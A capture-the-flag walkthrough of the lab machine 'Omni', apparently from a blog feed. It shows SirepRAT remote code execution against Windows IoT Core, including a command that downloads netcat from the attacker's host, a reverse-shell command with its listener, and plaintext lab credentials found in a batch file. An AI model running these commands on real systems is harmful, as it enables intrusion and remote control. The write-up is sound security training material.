-8080/tcp open  upnp    Microsoft IIS httpd
-<span class="p">|</span> http-auth:
-<span class="p">|</span> HTTP/1.1 <span class="m">401</span> Unauthorized<span class="se">\x</span>0D
-<span class="p">|</span>_  Basic <span class="nv">realm</span><span class="o">=</span>Windows Device Portal
-<span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
-<span class="p">|</span>_http-title: Site doesn’t have a title.
-Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
-</code></pre></div><h2 id="enumeration">Enumeration</h2>
-<h3 id="tcp-8080---website">TCP 8080 - Website</h3>
-<p>Based on the <code>nmap</code>&rsquo;s result, authentication process is required to view the page content, and looks like it uses the basic HTTP authentication.</p>
-<blockquote>
-<p>With default script (<code>-sC</code>), <code>nmap</code> can retrieves the authentication scheme and realm of a web service that requires authentication.</p>
-</blockquote>
-<p><code>nmap</code> identifies the realm as &ldquo;Windows Device Portal&rdquo;, and here is what I found on Google.</p>
-<p><img class="img-container" src="imgs/image-20210507000141372.png" alt="image-20210507000141372"  />
-</p>
-<p>According to the table from <a href="https://docs.microsoft.com/en-us/windows/uwp/debug-test-perf/device-portal">this documentation</a>, Windows Device Portal (WDP) on port 8080 belongs to the IoT family, which means this machine is most likely running a Windows 10 IoT version.</p>
-<p><img class="img-container" src="imgs/image-20210507000331533.png" alt="image-20210507000331533"  />
-</p>
-<p>So, without credentials, I can&rsquo;t do anything here.</p>
-<h2 id="foothold">Foothold</h2>
-<p>There is a research about unauthenticated remote code execution on Windows IoT Core. The research documents (slides, paper) as well as the exploit tool are provided in the link below.</p>
-<ul>
-<li><a href="https://github.com/SafeBreach-Labs/SirepRAT/">https://github.com/SafeBreach-Labs/SirepRAT/</a></li>
-</ul>
-<h3 id="shell-as-omni">Shell as Omni$</h3>
-<h4 id="sireprat-rce">SirepRAT RCE</h4>
-<p>The exploit tool is work against this machine, and I can get a remote code execution as Omni$ / SYSTEM.</p>
-<p>To get an interactive shell, I&rsquo;ll host Windows <code>nc64.exe</code> using Python HTTP server.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «omni» «10.10.14.47»
-$ python -m http.server <span class="m">80</span>
-Serving HTTP on 0.0.0.0 port <span class="m">80</span> <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
-</code></pre></div><p>I&rsquo;ll get the hosted netcat on Omni using PowerShell <code>Invoke-WebRequest</code> command by leveraging the SirepRAT RCE.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «omni» «10.10.14.47»
-$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd <span class="s2">&#34;C:\Windows\System32\cmd.exe&#34;</span> --args <span class="s2">&#34;/c powershell -c Invoke-webrequest -uri 10.10.14.68/nc64.exe -outfile U:\Users\Public\xc.exe&#34;</span> --vv
-RECV:
-00000000: 2A 4C <span class="m">59</span> A5 FB <span class="m">60</span> <span class="m">04</span> <span class="m">47</span>  A9 6D 1C C9 7D C8 4F <span class="m">12</span>  *LY..<span class="sb">`</span>.G.m..<span class="o">}</span>.O.
-SEND:
-00000000: 0A <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">12</span> <span class="m">01</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">01</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">01</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  ................
-00000010: <span class="m">24</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">36</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  5A <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> B8 <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  $...6...Z.......
-00000020: <span class="m">12</span> <span class="m">01</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">43</span> <span class="m">00</span> 3A <span class="m">00</span>  ............C.:.
-00000030: 5C <span class="m">00</span> <span class="m">57</span> <span class="m">00</span> <span class="m">69</span> <span class="m">00</span> 6E <span class="m">00</span>  <span class="m">64</span> <span class="m">00</span> 6F <span class="m">00</span> <span class="m">77</span> <span class="m">00</span> <span class="m">73</span> <span class="m">00</span>  <span class="se">\.</span>W.i.n.d.o.w.s.
-00000040: 5C <span class="m">00</span> <span class="m">53</span> <span class="m">00</span> <span class="m">79</span> <span class="m">00</span> <span class="m">73</span> <span class="m">00</span>  <span class="m">74</span> <span class="m">00</span> <span class="m">65</span> <span class="m">00</span> 6D <span class="m">00</span> <span class="m">33</span> <span class="m">00</span>  <span class="se">\.</span>S.y.s.t.e.m.3.
-00000050: <span class="m">32</span> <span class="m">00</span> 5C <span class="m">00</span> <span class="m">63</span> <span class="m">00</span> 6D <span class="m">00</span>  <span class="m">64</span> <span class="m">00</span> 2E <span class="m">00</span> <span class="m">65</span> <span class="m">00</span> <span class="m">78</span> <span class="m">00</span>  2.<span class="se">\.</span>c.m.d...e.x.
-00000060: <span class="m">65</span> <span class="m">00</span> 2F <span class="m">00</span> <span class="m">63</span> <span class="m">00</span> <span class="m">20</span> <span class="m">00</span>  <span class="m">70</span> <span class="m">00</span> 6F <span class="m">00</span> <span class="m">77</span> <span class="m">00</span> <span class="m">65</span> <span class="m">00</span>  e./.c. .p.o.w.e.
-00000070: <span class="m">72</span> <span class="m">00</span> <span class="m">73</span> <span class="m">00</span> <span class="m">68</span> <span class="m">00</span> <span class="m">65</span> <span class="m">00</span>  6C <span class="m">00</span> 6C <span class="m">00</span> <span class="m">20</span> <span class="m">00</span> 2D <span class="m">00</span>  r.s.h.e.l.l. .-.
-00000080: <span class="m">63</span> <span class="m">00</span> <span class="m">20</span> <span class="m">00</span> <span class="m">49</span> <span class="m">00</span> 6E <span class="m">00</span>  <span class="m">76</span> <span class="m">00</span> 6F <span class="m">00</span> 6B <span class="m">00</span> <span class="m">65</span> <span class="m">00</span>  c. .I.n.v.o.k.e.
-00000090: 2D <span class="m">00</span> <span class="m">77</span> <span class="m">00</span> <span class="m">65</span> <span class="m">00</span> <span class="m">62</span> <span class="m">00</span>  <span class="m">72</span> <span class="m">00</span> <span class="m">65</span> <span class="m">00</span> <span class="m">71</span> <span class="m">00</span> <span class="m">75</span> <span class="m">00</span>  -.w.e.b.r.e.q.u.
-000000A0: <span class="m">65</span> <span class="m">00</span> <span class="m">73</span> <span class="m">00</span> <span class="m">74</span> <span class="m">00</span> <span class="m">20</span> <span class="m">00</span>  2D <span class="m">00</span> <span class="m">75</span> <span class="m">00</span> <span class="m">72</span> <span class="m">00</span> <span class="m">69</span> <span class="m">00</span>  e.s.t. .-.u.r.i.
-000000B0: <span class="m">20</span> <span class="m">00</span> <span class="m">31</span> <span class="m">00</span> <span class="m">30</span> <span class="m">00</span> 2E <span class="m">00</span>  <span class="m">31</span> <span class="m">00</span> <span class="m">30</span> <span class="m">00</span> 2E <span class="m">00</span> <span class="m">31</span> <span class="m">00</span>   .1.0...1.0...1.
-000000C0: <span class="m">34</span> <span class="m">00</span> 2E <span class="m">00</span> <span class="m">34</span> <span class="m">00</span> <span class="m">37</span> <span class="m">00</span>  2F <span class="m">00</span> 6E <span class="m">00</span> <span class="m">63</span> <span class="m">00</span> <span class="m">36</span> <span class="m">00</span>  4...4.7./.n.c.6.
-000000D0: <span class="m">34</span> <span class="m">00</span> 2E <span class="m">00</span> <span class="m">65</span> <span class="m">00</span> <span class="m">78</span> <span class="m">00</span>  <span class="m">65</span> <span class="m">00</span> <span class="m">20</span> <span class="m">00</span> 2D <span class="m">00</span> 6F <span class="m">00</span>  4...e.x.e. .-.o.
-000000E0: <span class="m">75</span> <span class="m">00</span> <span class="m">74</span> <span class="m">00</span> <span class="m">66</span> <span class="m">00</span> <span class="m">69</span> <span class="m">00</span>  6C <span class="m">00</span> <span class="m">65</span> <span class="m">00</span> <span class="m">20</span> <span class="m">00</span> <span class="m">55</span> <span class="m">00</span>  u.t.f.i.l.e. .U.
-000000F0: 3A <span class="m">00</span> 5C <span class="m">00</span> <span class="m">55</span> <span class="m">00</span> <span class="m">73</span> <span class="m">00</span>  <span class="m">65</span> <span class="m">00</span> <span class="m">72</span> <span class="m">00</span> <span class="m">73</span> <span class="m">00</span> 5C <span class="m">00</span>  :.<span class="se">\.</span>U.s.e.r.s.<span class="se">\.</span>
-00000100: <span class="m">70</span> <span class="m">00</span> <span class="m">75</span> <span class="m">00</span> <span class="m">62</span> <span class="m">00</span> 6C <span class="m">00</span>  <span class="m">69</span> <span class="m">00</span> <span class="m">63</span> <span class="m">00</span> 5C <span class="m">00</span> <span class="m">78</span> <span class="m">00</span>  p.u.b.l.i.c.<span class="se">\.</span>x.
-00000110: <span class="m">63</span> <span class="m">00</span> 2E <span class="m">00</span> <span class="m">65</span> <span class="m">00</span> <span class="m">78</span> <span class="m">00</span>  <span class="m">65</span> <span class="m">00</span>                    c...e.x.e.
-RECV:
-00000000: <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>                                       ....
-&lt;HResultResult <span class="p">|</span> type: 1, payload length: 4, HResult: 0x0&gt;
-</code></pre></div><p>After that, I&rsquo;ll setup a listener, and send a reverse shell to my listener from Omni.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «omni» «10.10.14.47»
-$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd <span class="s2">&#34;C:\Windows\System32\cmd.exe&#34;</span> --args <span class="s2">&#34;/c U:\Users\public\xc.exe -e cmd.exe 10.10.14.47 1337
-</span><span class="s2">&lt;HResultResult | type: 1, payload length: 4, HResult: 0x0
-</span></code></pre></div><p>And I have interactive shell now.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="err">→</span> <span class="n">root</span><span class="nv">@iamf</span> <span class="err">«</span><span class="n">omni</span><span class="err">»</span> <span class="err">«</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">47</span><span class="err">»</span>
-<span class="p">$</span> <span class="n">rlwrap</span> <span class="n">nc</span> <span class="n">-nvlp</span> <span class="n">1337</span>
-<span class="n">listening</span> <span class="n">on</span> <span class="no">[any]</span> <span class="n">1337</span> <span class="p">...</span>
-<span class="n">connect</span> <span class="n">to</span> <span class="p">[</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">47</span><span class="p">]</span> <span class="n">from</span> <span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">204</span><span class="p">]</span> <span class="n">49689</span>
-<span class="n">Microsoft</span> <span class="n">Windows</span> <span class="no">[Version 10.0.17763.107]</span>
-<span class="n">Copyright</span> <span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="n">Microsoft</span> <span class="n">Corporation</span><span class="p">.</span> <span class="n">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="p">.</span>
-
-<span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="nv">$env:username</span>
-<span class="n">Omni</span><span class="p">$</span>
-</code></pre></div><h3 id="internal-enumeration">Internal Enumeration</h3>
-<p>Enumerating for the flags finds they are located at <code>C:\Data\Users\administrator\root.txt</code> and <code>C:\Data\Users\app\user.txt</code>. Since I have access as the SYSTEM itself, I can read both the user flag and the root flag directly, but the flags are encrypted.</p>
-<p><code>root.txt</code>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml">PS C:\&gt; type C:\Data\Users\administrator\root.txt
-type root.txt
-<span class="nt">&lt;Objs</span> <span class="na">Version=</span><span class="s">&#34;1.1.0.1&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;http://schemas.microsoft.com/powershell/2004/04&#34;</span><span class="nt">&gt;</span>
-  <span class="nt">&lt;Obj</span> <span class="na">RefId=</span><span class="s">&#34;0&#34;</span><span class="nt">&gt;</span>
-    <span class="nt">&lt;TN</span> <span class="na">RefId=</span><span class="s">&#34;0&#34;</span><span class="nt">&gt;</span>
-      <span class="nt">&lt;T&gt;</span>System.Management.Automation.PSCredential<span class="nt">&lt;/T&gt;</span>
-      <span class="nt">&lt;T&gt;</span>System.Object<span class="nt">&lt;/T&gt;</span>
-    <span class="nt">&lt;/TN&gt;</span>
-    <span class="nt">&lt;ToString&gt;</span>System.Management.Automation.PSCredential<span class="nt">&lt;/ToString&gt;</span>
-    <span class="nt">&lt;Props&gt;</span>
-      <span class="nt">&lt;S</span> <span class="na">N=</span><span class="s">&#34;UserName&#34;</span><span class="nt">&gt;</span>flag<span class="nt">&lt;/S&gt;</span>
-      <span class="nt">&lt;SS</span> <span class="na">N=</span><span class="s">&#34;Password&#34;</span><span class="nt">&gt;</span>01000000d08c9ddf0115d1118c7a00c04fc297eb0100000011d9a9af9398c648be30a7dd764d1f3a000000000200000000001066000000010000200000004f4016524600b3914d83c0f88322cbed77ed3e3477dfdc9df1a2a5822021439b000000000e8000000002000020000000dd198d09b343e3b6fcb9900b77eb64372126aea207594bbe5bb76bf6ac5b57f4500000002e94c4a2d8f0079b37b33a75c6ca83efadabe077816aa2221ff887feb2aa08500f3cf8d8c5b445ba2815c5e9424926fca73fb4462a6a706406e3fc0d148b798c71052fc82db4c4be29ca8f78f0233464400000008537cfaacb6f689ea353aa5b44592cd4963acbf5c2418c31a49bb5c0e76fcc3692adc330a85e8d8d856b62f35d8692437c2f1b40ebbf5971cd260f738dada1a7<span class="nt">&lt;/SS&gt;</span>
-    <span class="nt">&lt;/Props&gt;</span>
-  <span class="nt">&lt;/Obj&gt;</span>
-<span class="nt">&lt;/Objs&gt;</span>
-</code></pre></div><p><code>user.txt</code>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml">PS C:\&gt; type C:\Data\Users\app\user.txt
-type C:\Data\Users\app\user.txt
-<span class="nt">&lt;Objs</span> <span class="na">Version=</span><span class="s">&#34;1.1.0.1&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;http://schemas.microsoft.com/powershell/2004/04&#34;</span><span class="nt">&gt;</span>
-  <span class="nt">&lt;Obj</span> <span class="na">RefId=</span><span class="s">&#34;0&#34;</span><span class="nt">&gt;</span>
-    <span class="nt">&lt;TN</span> <span class="na">RefId=</span><span class="s">&#34;0&#34;</span><span class="nt">&gt;</span>
-      <span class="nt">&lt;T&gt;</span>System.Management.Automation.PSCredent^M^M      <span class="nt">&lt;T&gt;</span>System.Management.Automation.PSCredent^M^M      <span class="nt">&lt;T&gt;</span>System.Management.Automation.PSCredential<span class="nt">&lt;/T&gt;</span>
-      <span class="nt">&lt;T&gt;</span>System.Object<span class="nt">&lt;/T&gt;</span>
-    <span class="nt">&lt;/TN&gt;</span>
-    <span class="nt">&lt;ToString&gt;</span>System.Management.Automation.PSCredential<span class="nt">&lt;/ToString&gt;</span>
-    <span class="nt">&lt;Props&gt;</span>
-      <span class="nt">&lt;S</span> <span class="na">N=</span><span class="s">&#34;UserName&#34;</span><span class="nt">&gt;</span>flag<span class="nt">&lt;/S&gt;</span>
-      <span class="nt">&lt;SS</span> <span class="na">N=</span><span class="s">&#34;Password&#34;</span><span class="nt">&gt;</span>01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7<span class="nt">&lt;/SS&gt;</span>
-    <span class="nt">&lt;/Props&gt;</span>
-  <span class="nt">&lt;/Obj&gt;</span>
-<span class="nt">&lt;/Objs&gt;</span>
-</code></pre></div><p><a href="https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx">This article</a> shows way to decrypt those two files.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$credential</span> <span class="p">=</span> <span class="nb">Import-CliXml</span> <span class="n">-Path</span>  <span class="p">&lt;</span><span class="n">PathToXml</span><span class="p">&gt;\</span><span class="n">MyCredential</span><span class="p">.</span><span class="n">xml</span>
-<span class="nv">$credential</span><span class="p">.</span><span class="n">GetNetworkCredential</span><span class="p">().</span><span class="n">Password</span>
-</code></pre></div><p>But then, I get an &ldquo;<em>Error occurred during a cryptographic operation</em>&rdquo; message. After <em>Googling</em> around to find the answer why it doesn’t work, it turns out the flag can only be decrypted by the user itself. So if I want to decrypt <code>user.txt</code>, I have to get access as <code>app</code> user.</p>
-<p>While enumerating files recursively using the <code>dir</code> command, I spotted a batch file placed in the PowerShell folder.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">PS C:\&gt;cmd /c &#34;dir /s /b *.bat&#34;
-cmd /c &#34;dir /s /b *.bat&#34;
-C:\Program Files\WindowsPowerShell\Modules\PackageManagement\r.bat
-C:\Program Files\WindowsPowerShell\Modules\Pester\3.4.0\Build.bat
-C:\Program Files\WindowsPowerShell\Modules\Pester\3.4.0\bin\Pester.bat
-</code></pre></div><p>The batch files contains the credentials for user <code>app</code> and <code>administrator</code>. The file itself looks like automation script to revert the user and admin account to default.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">PS C:\&gt; gc &#34;C:\Program Files\WindowsPowerShell\Modules\PackageManagement\r.bat&#34;
-gc &#34;C:\Program Files\WindowsPowerShell\Modules\PackageManagement\r.bat&#34;
-@echo off
-
-:LOOP
-
-for /F &#34;skip=6&#34; %%i in (&#39;net localgroup &#34;administrators&#34;&#39;) do net localgroup &#34;administrators&#34; %%i /delete
-
-net user app mesh5143
-net user administrator _1nt3rn37ofTh1nGz
-
-ping -n 3 127.0.0.1
-
-cls
-
-GOTO :LOOP
-
-:EXIT
-</code></pre></div><h3 id="decrypting-the-flags">Decrypting the Flags</h3>
-<p>Both credentials are works on the Windows Device Portal (WDP) web. WDP has a feature that allows you to do command execution on the system, so I can decrypt each flag from there.</p>
-<p>For the root flag, I&rsquo;ll use the administrator account (<code>administrator:_1nt3rn37ofTh1nGz</code>) and issue the command below.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-c</span> <span class="s2">&#34;$credential=Import-CliXml -Path U:\Users\Administrator\root.txt ;$credential.GetNetworkCredential().Password;&#34;</span>
-</code></pre></div><p><img class="img-container" src="imgs/image-20210507020847618.png" alt="image-20210507020847618"  />
-</p>
-<p>For the user flag, the procedure goes the same.</p>
-<hr>
-<h2 id="references">References</h2>
-<ul>
-<li><a href="https://nmap.org/nsedoc/scripts/http-auth.html">https://nmap.org/nsedoc/scripts/http-auth.html</a></li>
-<li><a href="https://github.com/SafeBreach-Labs/SirepRAT">https://github.com/SafeBreach-Labs/SirepRAT</a></li>
 </ul>
 ]]></content:encoded>
     </item>
